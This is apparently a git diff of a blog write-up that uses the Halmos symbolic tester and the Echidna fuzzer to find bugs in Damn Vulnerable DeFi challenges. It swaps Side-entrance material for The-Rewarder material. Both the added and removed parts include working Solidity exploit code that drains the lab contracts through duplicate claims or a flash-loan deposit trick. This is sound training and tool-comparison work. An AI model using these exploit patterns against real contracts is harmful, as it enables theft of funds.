@@ -42,15 +42,22 @@ Also, let's clearly talk that despite the same name, the "The-rewarder" challeng
     ```solidity
     startHoax(deployer, 1 << 80);
     ```
-6. Print all contract addresses, including the upcoming **SymbolicAttacker**:
+6. Print all contract addresses:
     ```solidity
-    SymbolicAttacker attacker = new SymbolicAttacker();
     console.log("GlobalStorage", address(glob));
     console.log("DamnValuableToken", address(dvt));
     console.log("WETH", address(weth));
     console.log("TheRewarderDistributor", address(distributor));
-    console.log("SymbolicAttacker", address(attacker));
     ```
+    ```javascript
+    $ halmos --solver-timeout-assertion 0 --function check_theRewarder
+    ...
+    [console.log] GlobalStorage 0x00000000000000000000000000000000000000000000000000000000aaaa0002
+    [console.log] DamnValuableToken 0x00000000000000000000000000000000000000000000000000000000aaaa0003
+    [console.log] WETH 0x00000000000000000000000000000000000000000000000000000000aaaa0004
+    [console.log] TheRewarderDistributor 0x00000000000000000000000000000000000000000000000000000000aaaa0006
+    ```
+7. vm.expectRevert() is unsupportable cheat-code. Just delete it.
 ### _isSolved() implementation
 The original checks look like:
 ```solidity
@@ -127,7 +134,7 @@ function _loadRewardsWETH() private view returns (bytes32[] memory leaves) {
 }
 ```
 This thing works for a long time in Halmos: it took all of 2 minutes on my machine to create dvt and weth leaves.
-### dealing with merkle.getRoot()
+### Dealing with Merkle functions
 Again cryptography puts a spanner in our works. This time when we try to run the test we get an error:
 ```javascript
 $ halmos --solver-timeout-assertion 0 --function check_theRewarder
@@ -161,287 +168,416 @@ Logs:
     ...
 ```
 So, Halmos test:
-
-## Improvement of coverage
-According to the familiar principle, we start with single symbolic transaction. Let's see if all the code is covered:
 ```solidity
-function check_sideEntrance() public checkSolvedByPlayer {
+merkle = new Merkle();
+dvtRoot = hex"399df90cbebfb0e630b6da99a45325404a758823effc616197f3c33f749cb5d4";
+wethRoot = hex"5a1b4e345b2e4419e385fa460b91decd0d9d34cac0bd187aedea5484d2cdd6f6";
+//dvtRoot = merkle.getRoot(dvtLeaves);
+//wethRoot = merkle.getRoot(wethLeaves);
+```
+Let's do a similar trick with Alice's merkle.getProof(). Halmos test is changed to:
+```solidity
+// Create Alice's claims
+Claim[] memory claims = new Claim[](2);
+bytes32[] memory dvtproof = new bytes32[](3);
+dvtproof[0] = hex"925450a3cfe3826ad85358e2b3df638edc7c8553b6faee9e40fd9c6e9e3a3e04";
+dvtproof[1] = hex"f262e0db29c13826883ed5262d51ad286f1bd627b4632141534c6cb80f01f430";
+dvtproof[2] = hex"5ad8d27e776667615f79b7c7be79980ac8352518ca274a8ed68a9953ee4302d5";
+
+bytes32[] memory wethproof = new bytes32[](3);
+wethproof[0] = hex"7217ae40b137a0d9d7179ef8bb0d0a0a8002dc6fefed8e9faa17b29bc037b747";
+wethproof[1] = hex"fdad7418265f24fd2100fbcde33a22785f151aa01ab26aefd76c58bbfa0a9592";
+wethproof[2] = hex"0be25e66daab92e7052e6c307ae4743bba49ae08c7324acbc3eb730f51b991e0";
+
+// First, the DVT claim
+claims[0] = Claim({
+    batchNumber: 0, // claim corresponds to first DVT batch
+    amount: ALICE_DVT_CLAIM_AMOUNT,
+    tokenIndex: 0, // claim corresponds to first token in `tokensToClaim` array
+    proof: dvtproof // Alice's address is at index 2
+});
+console.log("claims[0] created");
+
+// And then, the WETH claim
+claims[1] = Claim({
+    batchNumber: 0, // claim corresponds to first WETH batch
+    amount: ALICE_WETH_CLAIM_AMOUNT,
+    tokenIndex: 1, // claim corresponds to second token in `tokensToClaim` array
+    proof: wethproof // Alice's address is at index 2
+});
+```
+And another such place is MerkleProof.verify() with TheRewarderDistributor::claimRewards():
+```solidity
+function claimRewards(Claim[] memory inputClaims, IERC20[] memory inputTokens) external {
     ...
-    attacker.attack();
+    bytes32 leaf = keccak256(abi.encodePacked(msg.sender, inputClaim.amount));
+    bytes32 root = distributions[token].roots[inputClaim.batchNumber];
+    if (!MerkleProof.verify(inputClaim.proof, root, leaf)) revert InvalidProof();
+    ...
 }
 ```
+Processing cryptographic proofs is very difficult for Halmos. Let's just remove this check, but at the same time assume that we have entered the correct data. We did something similar in Naive-receiver (ADD LINK).
 ```solidity
-contract SymbolicAttacker is Test, SymTest {
-    ...
-    function attack() public {
-        execute_tx();
-    }
+...
+if (msg.sender == address(0x44E97aF4418b7a17AABD8090bEA0A471a366305C)) // player address
+{
+    if (address(token) == address(0xaaaa0003)) // If DVT token
+        vm.assume(inputClaim.amount == 11524763827831882);
+    else if (address(token) == address(0xaaaa0004)) // If WETH token
+        vm.assume(inputClaim.amount == 1171088749244340);
+}
+//bytes32 leaf = keccak256(abi.encodePacked(msg.sender, inputClaim.amount));
+//bytes32 root = distributions[token].roots[inputClaim.batchNumber];
+
+//if (!MerkleProof.verify(inputClaim.proof, root, leaf)) revert InvalidProof();
+...
 ```
-### Callbacks
+### Avoiding nested vm.startPrank()
+The current version of Halmos does not support nested startPrank(). So let's replace
+```solidity
+startHoax(deployer, 1 << 80);
+...
+vm.startPrank(alice);
+...
+vm.stopPrank(); // stop alice prank
+vm.stopPrank(); // stop deployer prank
+```
+by
+```solidity
+startHoax(deployer, 1 << 80);
+...
+vm.stopPrank(); // stop deployer prank
+vm.startPrank(alice);
+...
+vm.stopPrank(); // stop alice prank
+```
+Wow, it was really a long preparation. Let's move on to the next steps!
+## No SymbolicAttacker? 
+There is a feature in this challenge that prevents us from using the convenient "SymbolicAttacker" proxy contract. Since the logic of TheRewarderDistributor contract is tied to the player's specific address, msg.sender in TheRewarderDistributor should be exactly the player's address. Instead, we'll move all of the SymbolicAttacker logic right into TheRewarderChallenge contract.
+## Improvement of coverage
+Plannedly launch one symbolic transaction to check whether all paths are covered:
+```solidity
+function attack() private {
+    execute_tx();
+    //execute_tx();
+}
+function check_theRewarder() public checkSolvedByPlayer {
+    ...
+    attack();
+}
+```
+```javascript
+$ halmos --solver-timeout-assertion 0 --function check_theRewarder
+...
+[ERROR] check_theRewarder() (paths: 180, time: 30.22s, bounds: [])
+WARNING:halmos:Encountered symbolic memory offset: 704 + Concat(Extract(250, 0, p_inputClaims[0].tokenIndex_uint256_5cfd392_07), 0)
+...
+WARNING:halmos:check_theRewarder(): paths have not been fully explored due to the loop unrolling bound: 2
+...
+```
+### Increase the symbolic loops
+We have as many as 3 contracts stored in GlobalStorage, but Halmos runs 2 loop iterations by default. Let's add the parameter "--loop 3" to the Halmos command.
+### Symbolic token index
+The old symbolic offset problem, but in a new form. This time we are trying to retrieve an IERC20 token by index, which is a symlobic value. and Halmos doesn't like it:
+```solidity
+function claimRewards(Claim[] memory inputClaims, IERC20[] memory inputTokens) external {
+    ...
+    if (token != inputTokens[inputClaim.tokenIndex]) {
+...
+```
+We will get around this by using a symbolic token instead of inputTokens[inputClaim.tokenIndex] everywhere:
+```solidity
+function claimRewards(Claim[] memory inputClaims, IERC20[] memory inputTokens) external {
+    ...
+    address symbolicInputToken = svm.createAddress("SymbolicInputToken");
+    if (msg.sender != address(0x44E97aF4418b7a17AABD8090bEA0A471a366305C)) // If Alice 
+    {
+        symbolicInputToken = address(inputTokens[inputClaim.tokenIndex]);
+    }
+    //if (token != inputTokens[inputClaim.tokenIndex]) {
+    if (token != IERC20(symbolicInputToken)) {
+        ...
+        //token = inputTokens[inputClaim.tokenIndex];
+        token = IERC20(symbolicInputToken);
+        ...
+    }
+    ...
+    //inputTokens[inputClaim.tokenIndex].transfer(msg.sender, inputClaim.amount);
+    IERC20(token).transfer(msg.sender, inputClaim.amount);
+}
+```
+Here it is also worth explicitly talking about how Halmos handles arrays of symbolic size, as in this case (if player calls this function symbolically - the size of inputClaims and inputTokens arrays will be symbolic). This is regulated by the --default-array-lengths parameter, which by default is "0,1,2". This means that Halmos will handle 3 cases separately: when array size is 0, when it is 1, and when it is 2.
+
 Run:
 ```javascript
-$ halmos --solver-timeout-assertion 0 --function check_sideEntrance -vvvvv
+$ halmos --solver-timeout-assertion 0 --function check_theRewarder --loop 3
 ...
-Path #4:
-            ...
-            CALL SideEntranceLenderPool::flashLoan(p_amount_uint256_a507985_05()) (value: halmos_ETH_val_uint256_4f72fbf_01)
-                CALL SymbolicAttacker::execute() (value: p_amount_uint256_a507985_05)
-                ↩ REVERT 0x (error: Revert())
-                ...
+Counterexample:
+halmos_SymbolicInputToken_address_05635b7_29 = 0x00000000000000000000000000000000aaaa0003
+halmos_SymbolicInputToken_address_b649884_30 = 0x00000000000000000000000000000000aaaa0003
+halmos_selector_bytes4_d3ac38a_28 = claimRewards
+halmos_target_address_dbdff73_03 = 0x00000000000000000000000000000000aaaa0006
+p_inputClaims[0].amount_uint256_0ac9401_08 = 0x0000000000000000000000000000000000000000000000000028f1b62e14044a
+p_inputClaims[0].batchNumber_uint256_31113fc_07 = 0x0000000000000000000000000000000000000000000000000000000000000000
+p_inputClaims[0].proof_length_7e0bd7f_10 = 0x0000000000000000000000000000000000000000000000000000000000000002
+p_inputClaims[1].amount_uint256_916073c_14 = 0x0000000000000000000000000000000000000000000000000028f1b62e14044a
+p_inputClaims[1].batchNumber_uint256_4f51f7f_13 = 0x0000000000000000000000000000000000000000000000000000000000000000
+p_inputClaims[1].proof_length_108c345_16 = 0x0000000000000000000000000000000000000000000000000000000000000002
+p_inputClaims_length_8309fbf_06 = 0x0000000000000000000000000000000000000000000000000000000000000002
+p_inputTokens[0]_address_58409a8_20 = 0x0000000000000000000000000000000000000000000000000000000000000000
+p_inputTokens[1]_address_b9b63db_21 = 0x0000000000000000000000000000000000000000000000000000000000000000
+p_inputTokens_length_8a67349_19 = 0x0000000000000000000000000000000000000000000000000000000000000002
 ...
-[PASS] check_sideEntrance() (paths: 9, time: 0.26s, bounds: [])
+Counterexample:
+halmos_SymbolicInputToken_address_05635b7_29 = 0x00000000000000000000000000000000aaaa0004
+halmos_SymbolicInputToken_address_7b0d29c_30 = 0x00000000000000000000000000000000aaaa0004
+halmos_selector_bytes4_d3ac38a_28 = claimRewards
+halmos_target_address_dbdff73_03 = 0x00000000000000000000000000000000aaaa0006
+p_inputClaims[0].amount_uint256_0ac9401_08 = 0x0000000000000000000000000000000000000000000000000004291958e62fb4
+p_inputClaims[0].batchNumber_uint256_31113fc_07 = 0x0000000000000000000000000000000000000000000000000000000000000000
+p_inputClaims[0].proof_length_7e0bd7f_10 = 0x0000000000000000000000000000000000000000000000000000000000000002
+p_inputClaims[1].amount_uint256_916073c_14 = 0x0000000000000000000000000000000000000000000000000004291958e62fb4
+p_inputClaims[1].batchNumber_uint256_4f51f7f_13 = 0x0000000000000000000000000000000000000000000000000000000000000000
+p_inputClaims[1].proof_length_108c345_16 = 0x0000000000000000000000000000000000000000000000000000000000000002
+p_inputClaims_length_8309fbf_06 = 0x0000000000000000000000000000000000000000000000000000000000000002
+p_inputTokens[0]_address_58409a8_20 = 0x0000000000000000000000000000000000000000000000000000000000000000
+p_inputTokens[1]_address_b9b63db_21 = 0x0000000000000000000000000000000000000000000000000000000000000000
+p_inputTokens_length_8a67349_19 = 0x0000000000000000000000000000000000000000000000000000000000000002
 ```
-There is a problem here: **SideEntranceLenderPool::flashLoan()** assumes that the contract that called this function has a payable callback "**execute()**", which our **SymbolicAttacker** does not have. 
-```solidity
-contract SideEntranceLenderPool {
-    ...
-    function flashLoan(uint256 amount) external {
-        ...
-        IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();
-    ...
-    }
-```
-We implement a valid execute:
-```solidity
-function execute () external payable {
-    uint256 ETH_val = svm.createUint256("ETH_val_execute");
-    address target = svm.createAddress("target_execute");
-    bytes memory data;
-    //Get some concrete target-name pair
-    (target, data) = glob.get_concrete_from_symbolic(target);
-    target.call{value: ETH_val}(data);
-}
-```
-And one more problem in **SideEntranceLenderPool::withdraw()**.
-Despite the fact that **SymbolicAttacker** had no pool balance at the time of the transaction, Halmos still attempted to transfer some symbolic amount of **ETH** to **SymbolicAttacker**. And this is what happened:
+We were lucky: one symbolic transaction was enough to find the bug. Let's deal with a counterexample.
+## Counterexamples analysis
+The 2 counterexamples provided are essentially one bug that worked separately on DVT and WETH tokens. In simple words, we can collect our reward several times if we pass the same tokenIndex several times in the inputClaims array:
 ```javascript
-Path #2:
-...
-           CALL SideEntranceLenderPool::withdraw() (value: halmos_ETH_val_uint256_4f72fbf_01)
-           ...
-                CALL SymbolicAttacker::0x
-                ↩ REVERT 0x (error: Revert())
-                ...
+halmos_SymbolicInputToken_address_05635b7_29 = 0x00000000000000000000000000000000aaaa0004
+halmos_SymbolicInputToken_address_7b0d29c_30 = 0x00000000000000000000000000000000aaaa0004
 ```
-We don't have the **receive()** callback function, so we implement it as well:
+Remember that we replaced the inputTokens[inputClaim] logic with a SymbolicInputToken, therefore, the logic of the bug is not so obvious from the counterexample. But nevertheless - a bug was found.
+## Using a counterexample
+In the Halmos test, we ignored cryptographic checks. However, we will use them here. We also remember that we need to transfer all funds to recovery. So, let's build an attack so as to empty the distributor for the maximum possible amount:
 ```solidity
-receive() external payable {
-    uint256 ETH_val = svm.createUint256("ETH_val_receive");
-    address target = svm.createAddress("target_receive");
-    bytes memory data;
-    //Get some concrete target-name pair
-    (target, data) = glob.get_concrete_from_symbolic(target);
-    target.call{value: ETH_val}(data);
+function test_theRewarder() public checkSolvedByPlayer {
+    bytes32[] memory dvtLeaves = _loadRewards(
+        "/test/the-rewarder/dvt-distribution.json"
+    );
+    bytes32[] memory wethLeaves = _loadRewards(
+        "/test/the-rewarder/weth-distribution.json"
+    );
+    uint256 dvtPlayerReward = 11524763827831882;
+    uint256 wethPlayerReward = 1171088749244340;
+    uint256 dvtAttackCount = TOTAL_DVT_DISTRIBUTION_AMOUNT / dvtPlayerReward;
+    uint256 wethAttackCount = TOTAL_WETH_DISTRIBUTION_AMOUNT / wethPlayerReward;
+
+    Claim[] memory claims = new Claim[](dvtAttackCount + wethAttackCount);
+    IERC20[] memory tokensToClaim = new IERC20[](2);
+    tokensToClaim[0] = IERC20(address(dvt));
+    tokensToClaim[1] = IERC20(address(weth));
+    for (uint256 i = 0; i < dvtAttackCount; i++) {
+        claims[i] = Claim({
+        batchNumber: 0, // claim corresponds to first DVT batch
+        amount: dvtPlayerReward,
+        tokenIndex: 0, // claim corresponds to first token in `tokensToClaim` array
+        proof: merkle.getProof(dvtLeaves, 188) // player's address is at index 188
+        });
+    }
+    for (uint256 i = 0; i < wethAttackCount; i++) {
+        claims[dvtAttackCount + i] = Claim({
+        batchNumber: 0, // claim corresponds to first DVT batch
+        amount: wethPlayerReward,
+        tokenIndex: 1, // claim corresponds to first token in `tokensToClaim` array
+        proof: merkle.getProof(wethLeaves, 188) // player's address is at index 188
+        });
+    }
+
+    distributor.claimRewards({
+        inputClaims: claims,
+        inputTokens: tokensToClaim
+    });
+
+    dvt.transfer(recovery, dvt.balanceOf(player));
+    weth.transfer(recovery, weth.balanceOf(player));
 }
 ```
-### Preventing recursion
-Now let's talk about possible recursion. This time, since we have 2 callback functions in **SymbolicAttacker** that behave like **execute_tx()**, we won't be able to conveniently use the **vm.assume(...)** pattern. At the same time, the standard [ReentrancyGuard](https://docs.openzeppelin.com/contracts/4.x/api/security#ReentrancyGuard) will not work for us, as it is common to all functions, which can cut off some scenarios.
-So, let's make our simplest analogue of **ReentrancyGuard**:
-```solidity
-contract SymbolicAttacker is Test, SymTest {
+Run:
+```javascript
+$ forge test --mp test/the-rewarder/TheRewarder.t.sol
 ...
-    bool receive_reent_guard = false;
-    bool execute_reent_guard = false;
+[PASS] test_theRewarder() (gas: 1005136185)
+...
+```
+Another challenge was solved using a bug found by Halmos!
+## Fuzzing time
+At the time of writing, I have not found a fuzzing solution for the updated version of "The-Rewarder". Let's try to implement it ourselves. We'll use Echidna as fuzzing engine.
+### Common preparations
+Echidna config file:
+```javascript
+deployer: '0xcafe0001' 
+sender: ['0x44E97aF4418b7a17AABD8090bEA0A471a366305C']
+allContracts: true
+workers: 8
+balanceContract: 100000000000000000000000000000000000000000000000000000000000000000000000
+```
+Since Echidna has the same problems with loading data from json - let's do the same trick using hardcoded data:
+```solidity
+constructor() public payable {
     ...
-    receive() external payable {
-        if (receive_reent_guard) {
-            revert();
-        }
-        receive_reent_guard = true;
-        ...
-        receive_reent_guard = false;
+    bytes32[] memory dvtLeaves = _loadRewardsDVT();
+    bytes32[] memory wethLeaves = _loadRewardsWETH();
+    ...
+}
+...
+function _loadRewardsDVT() private view returns (bytes32[] memory leaves) {
+    Reward[] memory rewards =
+        abi.decode(hex"000...e962", (Reward[]));
+    assertEq(rewards.length, BENEFICIARIES_AMOUNT);
+
+    leaves = new bytes32[](BENEFICIARIES_AMOUNT);
+    for (uint256 i = 0; i < BENEFICIARIES_AMOUNT; i++) {
+        leaves[i] = keccak256(abi.encodePacked(rewards[i].beneficiary, rewards[i].amount));
     }
-    
-    function execute () external payable {
-        if (execute_reent_guard) {
-            revert();
-        }
-        execute_reent_guard = true;
-        ...
-        execute_reent_guard = false;
+}
+
+function _loadRewardsWETH() private view returns (bytes32[] memory leaves) {
+    Reward[] memory rewards =
+        abi.decode(hex"000...b3d4", (Reward[]));
+    assertEq(rewards.length, BENEFICIARIES_AMOUNT);
+
+    leaves = new bytes32[](BENEFICIARIES_AMOUNT);
+    for (uint256 i = 0; i < BENEFICIARIES_AMOUNT; i++) {
+        leaves[i] = keccak256(abi.encodePacked(rewards[i].beneficiary, rewards[i].amount));
     }
+}
+```
+Also, for simplicity, we completely ignore the logic with Alice, since the fact that she took her tokens does not affect the presence of the bug in any way. We are only interested in whether Echidna can find the bug. So, invariant:
+```solidity
+function echidna_testSolved() public returns (bool) {
+    if (dvt.balanceOf(address(distributor)) >= 
+        TOTAL_DVT_DISTRIBUTION_AMOUNT - 11524763827831882) 
+    {
+        if (weth.balanceOf(address(distributor)) >= 
+            TOTAL_WETH_DISTRIBUTION_AMOUNT - 1171088749244340) 
+        {
+            return true;
+        }
+    }
+    return false;
+}
+```
+For Echidna, we will also simplify the task of proof checking in TheRewarderDistributor::claimRewards(). Let's remove this check but assume that we have passed correct arguments:
+```solidity
+if (token != inputTokens[inputClaim.tokenIndex]) {
+    if (inputTokens[inputClaim.tokenIndex] == 
+        IERC20(address(0x62d69f6867A0A084C6d313943dC22023Bc263691))) // weth
+    {
+        inputClaim.amount = 1171088749244340;
+    }
+    else if (inputTokens[inputClaim.tokenIndex] == 
+        IERC20(address(0xb4c79daB8f259C7Aee6E5b2Aa729821864227e84))) // dvt)
+    {
+        inputClaim.amount = 11524763827831882;
+    }
+    ...
+    //bytes32 leaf = keccak256(abi.encodePacked(msg.sender, inputClaim.amount));
+    //bytes32 root = distributions[token].roots[inputClaim.batchNumber];
+
+    //if (!MerkleProof.verify(inputClaim.proof, root, leaf)) revert InvalidProof();
+```
+Run:
+```javascript
+$ echidna test/the-rewarder/TheRewarderEchidna.sol --contract TheRewarderEchidna --config test/the-rewarder/the-rewarder.yaml --test-limit 10000000
+...
+echidna_testSolved: passing
+...
+```
+Nothing. 
+### Analysis of the limits of Echidna
+After this fail, I decided to check whether it would even be able to craft valid parameters that would take away at least its "fair" reward. 
+
+Let's simplify the invariant for a while:
+```solidity
+function echidna_testSolved() public returns (bool) {
+    if (dvt.balanceOf(address(distributor)) >= 
+        TOTAL_DVT_DISTRIBUTION_AMOUNT/* - 11524763827831882*/) 
+    {
+        if (weth.balanceOf(address(distributor)) >= 
+            TOTAL_WETH_DISTRIBUTION_AMOUNT/* - 1171088749244340*/) 
+        {
+            return true;
+        }
+    }
+    return false;
+}
 ```
 Run again:
 ```javascript
-$ halmos --solver-timeout-assertion 0 --function check_sideEntrance
+$ echidna test/the-rewarder/TheRewarderEchidna.sol --contract TheRewarderEchidna --config test/the-rewarder/the-rewarder.yaml --test-limit 10000000
 ...
-[PASS] check_sideEntrance() (paths: 57, time: 1.70s, bounds: [])
-...
-```
-Perfectly. The number of completed paths has increased. Well, you can already guess what will happen next :)
-## Increasing transactions
-Add another symbolic attacking transaction:
-```solidity
-function attack() public {
-    execute_tx();
-    execute_tx();
-}
-```
-Run:
-```javascript
-$ halmos --solver-timeout-assertion 0 --function check_sideEntrance
-...
-Counterexample:
-halmos_ETH_val_execute_uint256_c9b0694_07 = 0x000000000000000000000000000000000000000000000016bc1f3a7c229fd8e9
-halmos_ETH_val_receive_uint256_4d032b7_19 = 0x000000000000000000000000000000000000000000000016c7c8b6b3a7640000
-halmos_ETH_val_uint256_923f00f_01 = 0x0000000000000000000000000000000000000000000000000000000000000000
-halmos_ETH_val_uint256_d146144_13 = 0x0000000000000000000000000000000000000000000000000000000000000000
-halmos_selector_bytes4_2929a1b_18 = withdraw
-halmos_selector_bytes4_321817f_06 = flashLoan
-halmos_selector_bytes4_487ba75_12 = deposit
-halmos_selector_bytes4_780a835_24 = 0x00000000
-halmos_target_address_742d8e0_14 = 0x00000000000000000000000000000000aaaa0003
-halmos_target_address_8fb3daf_02 = 0x00000000000000000000000000000000aaaa0003
-halmos_target_execute_address_b2f1b7a_08 = 0x00000000000000000000000000000000aaaa0003
-halmos_target_receive_address_d6b1aa3_20 = 0x00000000000000000000000000000000aaaa0003
-p_amount_uint256_b5e253c_05 = 0x000000000000000000000000000000000000000000000016b9e8000000000000
-[FAIL] check_sideEntrance() (paths: 3334, time: 102.26s, bounds: [])
-```
-Okay, that was pretty easy. Let's analyze a counterexample.
-## Counterexamples analysis
-The counterexample clearly shows the sequence of what happened. 
-**SideEntranceLenderPool::flashLoan()** was called. pool called the **execute()** function from our **SymbolicAttacker**. He, in turn, using borrowed funds (and little amount of his own), put them on deposit in the same pool. **flashLoan** ended successfully, as the balance of the pool at the time of the end of flashLoan became even larger. After that, the **SymbolicAttacker** simply withdrew all the 
-unfair funds from the  deposit with the **withdraw()** function in the second transaction. 
-
-Let's also pay attention to what was done in the **receive()** callback:
-
-```javascript
-halmos_selector_bytes4_780a835_24 = 0x00000000
-halmos_ETH_val_receive_uint256_4d032b7_19 = 0x000000000000000000000000000000000000000000000016c7c8b6b3a7640000
-```
-Selector **0x00000000** is an **ETH** transfer. That is, it is simply sending a certain amount of **Ether** back to the pool. Since this does not affect the attack in any way, this part of the counterexample can be ignored when building the attack.
-## Using a counterexample
-Now, with the bug, the attack becomes obvious:
-```solidity
-pragma solidity =0.8.25;
-
-import {SideEntranceLenderPool} from "../../src/side-entrance/SideEntranceLenderPool.sol";
-import {SafeTransferLib} from "solady/utils/SafeTransferLib.sol";
-
-contract Attacker {
-    uint256 constant ETHER_IN_POOL = 1000e18;
-    SideEntranceLenderPool public pool;
-    uint256 public amount;
-    address public recovery;
-
-    constructor (   SideEntranceLenderPool _pool, 
-                    uint256 _amount, 
-                    address _recovery) {
-        pool = _pool;
-        amount = _amount;
-        recovery = _recovery;
-    }
-
-    receive() external payable {
-    }
-
-    function execute () external payable {
-        pool.deposit(amount);
-    }
-
-    function attack(address recovery) public {
-        pool.flashLoan(amount);
-        pool.withdraw();
-        SafeTransferLib.safeTransferETH(recovery, ETHER_IN_POOL);
-    }
-}
-```
-```solidity
-function test_sideEntrance() public checkSolvedByPlayer {
-    Attacker attacker = new Attacker(pool, 1000e18, recovery);
-    attacker.attack();
-}
-```
-Run:
-```javascript
-$ forge test --mp test/side-entrance/SideEntrance.t.sol
-...
-[PASS] test_sideEntrance() (gas: 295447)
-```
-Another Damn Vulnerable Defi challenge solved!
-## Fuzzing vs Side-entrance
-I found some solutions to this problem by fuzzing on the internet. First one is [this article](https://www.rareskills.io/post/invariant-testing-solidity) by **Team RareSkills**. But there is a problem with this solution: they used a **Handler** that was written in such a way that the **Foundry** fuzzer "knows" in advance what the bug is and how to exploit it. That is, they gave the fuzzer too big hint:
-```solidity
-import {SideEntranceLenderPool} from "../../src/SideEntranceLenderPool.sol";
-
-import "forge-std/Test.sol";
-
-contract Handler is Test {
-    // the pool contract
-    SideEntranceLenderPool pool;
-    
-    // used to check if the handler can withdraw ether after the exploit
-    bool canWithdraw;
-
-    constructor(SideEntranceLenderPool _pool) {
-        pool = _pool;
-
-        vm.deal(address(this), 10 ether);
-    }
-    
-    // this function will be called by the pool during the flashloan
-    function execute() external payable {
-        pool.deposit{value: msg.value}(); // !!! This line is too explicit hint
-        canWithdraw = true;
-    }
-    
-    // used for withdrawing ether balance in the pool
-    function withdraw() external {
-        if (canWithdraw) pool.withdraw();
-    }
-
-    // call the flashloan function of the pool, with a fuzzed amount
-    function flashLoan(uint amount) external {
-        pool.flashLoan(amount);
-    }
-
-    receive() external payable {}
-}
-```
-In my opinion, fuzzing through such a **Handler** is not enough to say that the **Foundry** is really capable of finding this kind of bugs.
-
-Another solution is made by the **Crytic team** and can be found [at this link](https://github.com/crytic/building-secure-contracts/blob/master/program-analysis/echidna/exercises/exercise7/solution.sol). Here the situation is much better: the solution is abstract enough and gives space for **Echidna** itself to find a bug. Besides, it only took a few seconds to find the bug.
-
-Let's compare how **Echidna** and **Halmos** solve the problem of "taking into account that any function can be executed inside **execute()**".
-
-Echidna:
-```solidity
-...
-function setEnableWithdraw(bool _enabled) public {
-    enableWithdraw = _enabled;
-}
-
-function setEnableDeposit(bool _enabled, uint256 _amount) public {
-    enableDeposit = _enabled;
-    depositAmount = _amount;
-}
-
-function execute() external payable override {
-    if (enableWithdraw) {
-        pool.withdraw();
-    }
-    if (enableDeposit) {
-        pool.deposit{value: depositAmount}();
-    }
-}
+echidna_testSolved: failed!💥
+  Call sequence:
+    TheRewarderDistributor.claimRewards([(3, 4, 2, ["s\208n\ENQ\233\198\246v\157\134Gsw\200)N\SI\137\210\184\138\175\254\207\217\DEL\197sy\235T\236", "z\DLE]\155\142)b\199\146\SI\159o\193\\\228\156\EOTk\237\216j\SOH%\131\193\&5\170\DELqzw\223"])],[0x1fffffffe, 0x1fffffffe, 0x62d69f6867a0a084c6d313943dc22023bc263691, 0xffffffff, 0x62d69f6867a0a084c6d313943dc22023bc263691, 0x2fffffffd, 0x1fffffffe, 0xffffffff, 0x0, 0xb4c79dab8f259c7aee6e5b2aa729821864227e84])
 ...
 ```
-We explicitly indicate which functions can be called and with which parameters. Obviously, if there was a larger setup - this code would become much more "bloated". We already saw something like this in ["Truster"](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/truster#echidna).
-
-Now Halmos:
+Cool! At least the "fair" transaction it found. Let's check if Echidna is able to generate the same simple transaction, but with a larger inputClaims array (at least of size 2):
 ```solidity
-function execute () external payable {
+function claimRewards(Claim[] memory inputClaims, IERC20[] memory inputTokens) external {
+    require(inputClaims.length >= 2);
     ...
-    uint256 ETH_val = svm.createUint256("ETH_val_execute");
-    address target = svm.createAddress("target_execute");
-    bytes memory data;
-    (target, data) = glob.get_concrete_from_symbolic(target);
-    target.call{value: ETH_val}(data);
+```
+Try:
+```javascript
+$ echidna test/the-rewarder/TheRewarderEchidna.sol --contract TheRewarderEchidna --config test/the-rewarder/the-rewarder.yaml --test-limit 10000000
+...
+echidna_testSolved: passing
+...
+```
+Yeah, the problem is that Echidna has a hard time generating an inputClaims array of size at least 2. I found the following [article](https://secure-contracts.com/program-analysis/echidna/fuzzing_tips.html#handling-dynamic-arrays) that recommends using the push-pop pattern in such cases:
+```solidity
+contract TheRewarderDistributor {
     ...
+    Claim[] public storageInputClaims;
+    IERC20[] public storageInputTokens;
+    ...
+    function pushClaim(Claim memory claim) public {
+        storageInputClaims.push(claim);
+    }
+    
+    function pushToken(IERC20 token) public {
+        storageInputTokens.push(token);
+    }
+
+    ...
+    function claimRewards(/*Claim[] memory inputClaims, IERC20[] memory inputTokens*/) external {
+        ...
+         for (uint256 i = 0; i < storageInputClaims.length; i++) {
+            inputClaim = storageInputClaims[i];
+            ...
+            if (token != storageInputTokens[inputClaim.tokenIndex]) {
+                ...
+                token = storageInputTokens[inputClaim.tokenIndex];
+                ...
+            }
+            ...
+            // for the last claim
+            if (i == storageInputClaims.length - 1) {
+                if (!_setClaimed(token, amount, wordPosition, bitsSet)) revert AlreadyClaimed();
+            }
+            ...
+        }
 }
 ```
-It is easy to see that the Halmos-based code provides a better abstraction for such cases and does a better job of expanding the setup.
+Start and pray:
+```javascript
+$ echidna test/the-rewarder/TheRewarderEchidna.sol --contract TheRewarderEchidna --config test/the-rewarder/the-rewarder.yaml --test-limit 10000000
+...
+echidna_testSolved: failed!💥
+  Call sequence:
+    TheRewarderDistributor.pushClaim((0, 0, 0, []))
+    TheRewarderDistributor.pushToken(0xb4c79dab8f259c7aee6e5b2aa729821864227e84)
+    TheRewarderDistributor.pushClaim((0, 0, 0, []))
+    TheRewarderDistributor.claimRewards()
+...
+```
+Success! the push-pop pattern really turned out to be effective.
 ## Conclusions
-1. Using already accumulated techniques and principles, we solved the next Damn Vulnerable Defi challenge with Halmos quite easily. Every step was obvious and self-explanatory.
-2. Adapting the test to a specific contract is a good idea. For example, in this challenge we adapted to use native **ETH**.
-3. We confirm again the conclusions we made earlier: in the case of a small setup, fuzzing really seems to be a very effective tool, even if it is necessary to use some transaction abstraction. However, fuzzing engines do not have convenient abstraction mechanisms, so if target contracts are tied to some logic of abstract calls, Halmos looks much more convenient and powerful.
+1. Even if we face some engine limitations (Halmos or Echidna) - don't be afraid to use "dirty" tricks, even if they look ugly. All for the sake of the result!
+2. When constructing tests with cryptographic checks, there is a very effective technique: we do not check cryptography at all, but we explicitly assume that the data was entered correctly.
+3. If we compare how Halmos and Echidna coped with this challenge, we can say that both tools did quite well. But, in my opinion, Halmos was a little more convenient - every step of contract preparation was obvious and planned, the tool itself gave a hint on how to change the target contract through warnings. At the same time, in the case of Echidna, we had to find the limits of code coverage manually and use not the most obvious technique to force fuzzing to cover the case with 2 inputClaims.
